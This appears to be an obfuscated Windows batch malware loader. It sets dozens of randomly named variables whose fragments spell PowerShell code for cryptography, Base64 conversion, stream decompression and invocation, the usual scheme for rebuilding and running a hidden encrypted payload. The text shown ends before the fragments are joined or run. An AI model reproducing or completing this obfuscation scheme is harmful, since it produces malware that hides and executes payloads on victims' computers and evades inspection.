@echo off
set "ZpPGlwRhta=eZVC"
set "LBtjXLqxmN=nage"
set "GogVneqokQ=cS ="
set "OFoyYWLnin=YOcS"
set "UfqKzonUgt=ptog"
set "tIoKxMybmn=S = "
set "MZkGLTFaVG=;$Hm"
set "uMgDzwnEJK=();$"
set "GxEiIxwbWB=rity"
set "QJralBiDFF=Star"
set "eRLWNEGTwF=bstr"
set "SamlpnrKqo=tem."
set "EbEXtOkKSB=raph"
set "ObrnffKzTx===')"
set "KCUmILnUBv=t Sy"
set "qdxsUrLoee=RMz "
set "XHUYeltyuf=-joi"
set "MUUODAMmMu= = ["
set "XhTMMqokcV=ZYYc"
set "XvfLtBleYe=SuKo"
set "qrZTSiLEpA=.Mod"
set "fzPotXkkwi=('da"
set "gErREfqvRW=Fina"
set "KlamhNpxod= [st"
set "UcrdGgnVXn=trea"
set "dHNtMYxiqc=.Sec"
set "gWuLOycCNg=yste"
set "fLFKusJKYC=kYOc"
set "sZuIdMvfRL=lit("
set "nfDzoiEuHE=grap"
set "hNleKomKur=)) {"
set "VKuxrkcPjX=[-1."
set "XlkcuYRtQA=..-1"
set "SNIrpgRFbX=ach "
set "UAsndJLULJ=Invo"
set "eWwFDXEekQ=Obje"
set "PIiMKWRYIl= New"
set "ecxfToXqQz=Obje"
set "iFKsgtzQcW=.Key"
set "ZVTLthdqwr=Comp"
set "oWYanSqdAh=rtS4"
set "dXqcPlbJWA=-joi"
set "aLvZuzHWKy=;$qx"
set "QyeoaiZvIw=stem"
set "lTiZPiBLQf=oryS"
set "TUizodPBrM=SuKo"
set "wZqGuhNjTc=oL'["
set "XAQvPTjYZP=] -j"
set "csnZkpztXh=kYOc"
set "FaRDbrKHUo=Comp"
set "biTANdPMQf=; };"
set "accLFjDAVQ=]::C"
set "WXODdeHsdy=.IO."
set "vHVlVRIWvT=('l0"
set "rvBbRhLfNS=pose"
set "zXPpxPpThW=736u"
set "ADskiQQUPl=raph"
set "aZLOBmwUPe=and "
set "hqcnclfwMA=Conv"
set "MqKBwZZtWO=onve"
set "szsfCjAcio=jw ="
set "dctXkkPVGa='txe"
